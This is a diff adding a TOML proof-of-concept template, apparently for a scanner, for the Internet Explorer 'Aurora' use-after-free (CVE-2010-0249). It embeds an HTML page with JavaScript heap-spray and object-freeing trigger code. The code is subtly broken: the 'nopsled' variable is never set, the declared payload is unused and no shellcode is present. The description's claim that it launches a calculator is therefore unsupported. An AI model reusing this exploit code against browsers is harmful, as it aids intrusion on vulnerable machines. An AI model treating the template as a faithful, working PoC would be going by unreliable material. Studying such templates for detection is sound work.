@@ -1,0 +1,63 @@
+[info]
+author = "AVE"
+description = "通过HTTP服务构造特制HTML页面，利用JavaScript堆喷射（heap spray）技术触发IE6/7/8的释放后重用（Use-After-Free）漏洞，验证目标是否存在CVE-2010-0249。PoC基于Ahmed Obied公开的利用代码，在IE6/Windows XP SP2上弹出计算器作为验证。"
+id = "POC-AVE-2010-0200"
+name = "Microsoft Internet Explorer Aurora 释放后重用内存破坏 PoC"
+severity = "high"
+tags = [
+    "cve-2010-0249",
+    "ms10-002",
+    "aurora",
+    "ie",
+    "use-after-free",
+]
+vuln_id = [
+    "CVE-2010-0249",
+    "AVE-2010-0200",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<html>
+<head>
+<script>
+var chunk_size, payload, nopsled;
+var heap_chunks = new Array();
+var cuteqq = unescape("%u0a0a%u0a0a");
+while (cuteqq.length < 0x10000) cuteqq += cuteqq;
+function spray_heap() {
+    for (var i = 0; i < 200; i++) {
+        heap_chunks[i] = nopsled + cuteqq;
+    }
+}
+function trigger_au() {
+    var obj = document.createElement("object");
+    document.body.appendChild(obj);
+    obj.outerHTML = "";
+    spray_heap();
+    location.reload();
+}
+</script>
+</head>
+<body onload="trigger_au()">
+<h1>CVE-2010-0249 PoC</h1>
+</body>
+</html>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "spray_heap",
+    "trigger_au",
+]
